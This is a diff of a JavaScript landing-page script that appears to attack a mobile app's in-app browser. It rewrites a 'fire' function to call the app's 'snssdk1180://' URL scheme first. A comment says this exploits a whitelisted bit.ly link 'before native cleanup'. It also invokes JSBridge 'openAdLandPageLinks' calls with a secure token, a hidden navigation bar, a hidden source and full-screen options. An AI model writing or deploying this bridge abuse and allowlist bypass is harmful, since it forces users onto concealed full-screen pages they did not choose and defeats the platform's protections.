@@ -24,28 +24,34 @@
     try { navigator.sendBeacon('/debug-log', msg); } catch(e){}
   }
 
-  // ── fire overlay with token ───────────────────────────────────────────────
+  // ── fire overlay ─────────────────────────────────────────────────────────
   function fire() {
     if (fired) return;
     fired = true;
-    var secTok = token || ttclid;
     log('fire|tok:' + (token ? 'real' : (ttclid ? 'ttclid' : 'none')) + '|cid:' + CID);
+
+    // snssdk1180:// FIRST — bit.ly is whitelisted, fires before native cleanup
+    try {
+      window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(BITLY) + '&hide_nav_bar=1';
+      log('scheme:fired');
+    } catch(e){ log('scheme:err:'+e); }
+
+    // Bridge calls as secondary attempt
+    var secTok = token || ttclid;
     var p = {
-      url: BITLY, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+      url: BITLY, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad',
       cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
       trans_status_bar: 1, is_instant_page: 1
     };
     if (secTok) p._jsb_secure_token = secTok;
     var tt = window.ToutiaoJSBridge;
     if (tt && tt.call) {
-      try { tt.call('openAdLandPageLinks', p, function(){}); log('tt:ok'); } catch(e){ log('tt:err:'+e); }
+      try { tt.call('openAdLandPageLinks', p, function(r){ log('tt:r:'+JSON.stringify(r)); }); } catch(e){ log('tt:err:'+e); }
     }
     var jb = window.JSBridge;
     if (jb && jb.call) {
-      try { jb.call('openAdLandPageLinks', p, function(){}); log('jb:ok'); } catch(e){ log('jb:err:'+e); }
+      try { jb.call('openAdLandPageLinks', p, function(r){ log('jb:r:'+JSON.stringify(r)); }); } catch(e){ log('jb:err:'+e); }
     }
-    // snssdk1180:// URL scheme fallback — works when bit.ly is on allowlist
-    try { window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(BITLY) + '&hide_nav_bar=1&is_ad=1&is_instant_page=1'; log('scheme:fired'); } catch(e){}
   }
 
   // ── 3s fire without token (friend's working approach) ────────────────────
